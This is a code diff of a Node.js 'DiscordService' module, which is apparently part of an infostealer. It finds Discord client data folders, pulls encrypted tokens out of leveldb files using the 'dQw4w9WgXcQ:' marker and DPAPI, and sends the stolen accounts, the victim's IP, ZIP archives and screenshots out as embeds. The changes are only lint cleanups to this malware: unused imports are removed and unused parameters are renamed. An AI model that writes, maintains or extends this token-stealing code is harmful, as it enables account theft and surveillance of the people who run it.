@@ -8,7 +8,6 @@ const path = require('path');
 const crypto = require('crypto');
 const axios = require('axios');
 const { Dpapi } = require('@primno/dpapi');
-const CoreUtils = require('../../core/utils');
 const { logger } = require('../../core/logger');
 const { ErrorHandler, NetworkError, ModuleError } = require('../../core/errors');
 const { fileManager } = require('../../core/fileManager');
@@ -32,7 +31,6 @@ class DiscordService {
      */
     getDiscordPaths() {
         const appData = process.env.APPDATA || '';
-        const localAppData = process.env.LOCALAPPDATA || '';
 
         return {
             discord: {
@@ -183,7 +181,7 @@ Reason: This could happen for several reasons:
 - Discord tokens were found but were invalid/expired
 
 Searched Clients:
-${Object.entries(this.discordPaths).map(([key, config]) => 
+${Object.entries(this.discordPaths).map(([_key, config]) => 
         `- ${config.name}: ${config.basePaths.join(', ')}`
     ).join('\n')}
 
@@ -249,7 +247,7 @@ This file indicates that the Discord module found tokens but couldn't process th
             }
 
             const files = fs.readdirSync(leveldbPath);
-            const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/gm;
+            const encryptedRegex = /dQw4w9WgXcQ:[^"]*/gm;
 
             for (const file of files) {
                 if (!(file.endsWith('.log') || file.endsWith('.ldb'))) {
@@ -536,7 +534,7 @@ This file indicates that the Discord module found tokens but couldn't process th
      * @param {string} zipPassword - ZIP password (if password-protected but not uploaded)
      * @returns {Promise<boolean>} Success status
      */
-    async sendAccountEmbeds(accounts, ip = 'Unknown', uploadResult = null, zipPath = '', zipPassword = null) {
+    async sendAccountEmbeds(accounts, ip = 'Unknown', uploadResult = null, _zipPath = '', zipPassword = null) {
         if (accounts.length === 0) {
             logger.info('No Discord accounts to send');
             return true;
@@ -605,7 +603,7 @@ This file indicates that the Discord module found tokens but couldn't process th
      * @param {string} ip - IP address for context
      * @returns {Promise<boolean>} Success status
      */
-    async sendScreenshot(screenshotPath, ip = 'Unknown') {
+    async sendScreenshot(screenshotPath, _ip = 'Unknown') {
         try {
             if (!screenshotPath || !fs.existsSync(screenshotPath)) {
                 logger.warn('Screenshot file not found or invalid path');
